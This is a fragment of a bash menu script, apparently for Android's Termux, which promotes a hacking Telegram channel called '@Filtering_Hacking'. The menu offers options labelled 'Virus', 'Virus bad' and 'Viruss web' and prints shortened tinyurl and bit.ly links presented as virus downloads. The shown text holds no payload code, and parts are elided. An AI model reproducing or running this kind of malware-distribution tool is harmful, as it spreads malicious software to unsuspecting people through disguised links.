...
'
echo " " 
echo -e "$blue            my channel telegram =$grn @Filtering_Hacking $rset"
echo -e "$red                   ~~> $ylo TackLorix$red <~~ $rset"
echo 
# Functions
echo " "
echo " "
...
menu(){
echo -e "$cyan             ＞＞＞＞>>>＞$ylo Virus $cyan ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                       />$cyan [\e[92m1\e[96m] Virus "
echo -e "$red                       />$pink [\e[92m2\e[96m] Virus bad"
echo -e "$red                       />$cyan [\e[92m3\e[96m] Viruss web"
echo -e "$red                       />$pink [\e[92m4\e[96m] Update script "
echo " "
echo " "
echo -e "$cyan               >＞＞＞＞＞$ylo Filtering$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#your number\e[92m < "
read optnz
if [ $optnz = "1" ];
then
virus
...
echo -e '\e[15m 
                   ...
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[96m  your Links :

         \e[95mL1NK :- \e[92m https://tinyurl.com/uppdatesnew\e[91m
                         Tack Lorix
"
echo
echo -ne "\e[92m#Type for exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
...
echo " "
echo " "
echo -e "\e[96m your link download Virus

        \e[95mL1NK :- \e[92mhttps://bit.ly/3fX8ljZ\e[93m
...
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://t.me/Filtering_Hacking 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
